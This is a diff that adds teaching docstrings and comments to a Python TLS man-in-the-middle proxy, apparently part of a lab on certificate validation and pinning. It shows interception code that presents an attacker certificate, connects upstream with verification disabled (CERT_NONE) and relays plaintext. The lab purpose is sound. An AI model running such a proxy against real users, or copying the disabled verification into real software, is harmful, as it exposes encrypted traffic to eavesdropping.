@@ -1,13 +1,43 @@
-﻿# mitm.py
-import socket, ssl, threading, argparse, config, time
+"""Educational TLS man-in-the-middle proxy for the lab scenarios.
+
+The proxy terminates TLS from the client using an attacker-controlled
+certificate, initiates a separate TLS session to the real server, and relays
+plaintext between the two.  It demonstrates how disabling certificate
+validation enables interception and why pinning stops the attack.
+
+⚠️ For teaching purposes only.  Do not deploy against systems without consent.
+"""
+import argparse
+import socket
+import ssl
+import threading
+import time
+
+import config
 from certs import ensure_mitm_certs
-import threading, socket  # (already present)
+
 STOP = threading.Event()
 
 HOST = "127.0.0.1"
 
 def relay(src, dst, name):
-    """Relay data between two TLS sockets, logging cleartext."""
+    """Relay decrypted data between sockets while optionally logging it.
+
+    Args:
+      src: Source socket object.
+      dst: Destination socket object.
+      name: Human-readable direction label for logging.
+
+    Returns:
+      None.
+
+    Raises:
+      None.  Errors are caught and the sockets are closed.
+
+    Security Notes:
+      - Demonstrates that once validation is bypassed, an attacker can read or
+        modify plaintext transparently despite TLS on the wire.
+    """
     try:
         while True:
             data = src.recv(4096)
@@ -33,6 +63,25 @@ def relay(src, dst, name):
         except: pass
 
 def handle_client(client_tls):
+    """Accept a victim TLS session and bridge it to the real server.
+
+    Args:
+      client_tls: TLS-wrapped socket from the victim client.
+
+    Returns:
+      None.
+
+    Raises:
+      None.  Exceptions trigger cleanup of the compromised session.
+
+    Security Notes:
+      - Creates a second ``SSLContext`` with ``CERT_NONE`` so the proxy trusts
+        any certificate presented by the real server.  The client's security
+        hinges entirely on its own validation/pinning settings.
+      - Two independent TLS handshakes occur: one with the client (using the
+        attacker's certificate) and one with the server (using normal trust).
+    """
+
     try:
         #print(f"[MITM] Connecting to real server {HOST}:{config.PORT_SERVER_REAL}")
         real_sock = socket.create_connection((HOST, config.PORT_SERVER_REAL))
@@ -44,9 +93,15 @@ def handle_client(client_tls):
             server_ctx.minimum_version = ssl.TLSVersion.TLSv1_3
         except AttributeError:
             server_ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+        # Disabling verification mirrors what an attacker-controlled proxy would
+        # do: trust everything so it can connect to any target regardless of
+        # certificate validity.
         server_ctx.check_hostname = False
         server_ctx.verify_mode = ssl.CERT_NONE
 
+        # Second TLS handshake (proxy -> real server).  If this fails the MITM
+        # cannot observe plaintext but the client still believes it connected to
+        # the intended host because of the forged certificate.
         real_tls = server_ctx.wrap_socket(real_sock, server_hostname="localhost")
         # print("[MITM] TLS handshake with real server successful")
 
@@ -60,6 +115,25 @@ def handle_client(client_tls):
         except: pass
 
 def main():
+    """Start the MITM proxy and accept victim connections.
+
+    Args:
+      None.  CLI arguments are read from ``sys.argv``.
+
+    Returns:
+      None.
+
+    Raises:
+      SystemExit: Propagated if critical setup fails.
+
+    Security Notes:
+      - Loads the attacker certificate and private key created via
+        ``ensure_mitm_certs``.  Clients that disable verification will accept
+        this certificate, proving the danger of ``CERT_NONE``.
+      - Acts as a TLS server toward the victim, so hostname checks and pinning
+        on the client are the primary defense.
+    """
+
     parser = argparse.ArgumentParser()
     parser.add_argument("--port", type=int, default=config.PORT_SERVER_MITM)
     args = parser.parse_args()
@@ -84,6 +158,9 @@ def main():
             client_sock, addr = s.accept()
             #print(f"[MITM] Accepted connection from {addr}")
             try:
+                # Victim TLS handshake terminates here using the attacker's
+                # certificate; this succeeds only if the client skipped
+                # validation or trusts the rogue certificate.
                 client_tls = context.wrap_socket(client_sock, server_side=True)
                 #print("[MITM] TLS handshake with client successful")
                 threading.Thread(target=handle_client, args=(client_tls,), daemon=True).start()
